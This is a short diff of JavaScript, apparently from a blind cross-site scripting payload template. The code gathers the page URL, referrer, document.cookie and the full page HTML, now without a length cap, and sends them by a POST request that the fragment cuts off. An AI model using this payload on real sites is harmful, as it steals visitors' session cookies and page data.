@@ -90,7 +90,7 @@ var Base64Binary = {
           var uri = document.URL;
           var referrer = document.referrer;
           var cookies = document.cookie;
-          var dom = document.documentElement.outerHTML.slice(1,65535);
+          var dom = document.documentElement.outerHTML;
           var xss_uid = {{xss_uid}};
             $.ajax({
                 type: "POST",
